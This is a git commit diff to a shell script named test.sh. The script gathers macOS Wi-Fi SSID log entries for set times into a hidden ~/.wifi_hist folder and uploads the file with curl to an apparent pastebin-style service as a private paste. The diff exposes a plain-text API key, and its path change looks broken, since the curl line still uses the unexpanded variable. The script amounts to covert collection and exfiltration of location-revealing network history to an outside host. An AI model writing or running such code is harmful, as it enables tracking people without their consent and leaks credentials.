3aca79d73b7b604cb7048b50f98cffc5a9c66688
digital-ninja-horse <sogrinvlad@yandex.ru>
2024-08-20 19:17:38 +0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -4,9 +4,11 @@ log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20
 log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 10:50:00" --end "2024-08-20 11:10:00" >> ~/.wifi_hist/hist.txt
 log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 12:45:00" --end "2024-08-20 13:00:00" >> ~/.wifi_hist/hist.txt
 log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 14:50:00" --end "2024-08-20 15:05:00" >> ~/.wifi_hist/hist.txt
+FILE_PATH="~/.wifi_hist/hist.txt"
+FULL_PATH=$(eval echo $FILE_PATH)
 curl -X POST -d 'api_dev_key=683c74cdc06c1d15c58c77ad7ee4aefb' \
      -d 'api_option=paste' \
-     -d 'api_paste_code=' --data-binary "@~/.wifi_hist/hist.txt" \
+     -d 'api_paste_code=' --data-binary "@${FILE_PATH}" \
      -d 'api_paste_private=2' \
      -d 'api_paste_name=hist.txt' \
      -d 'api_paste_expire_date=N' \
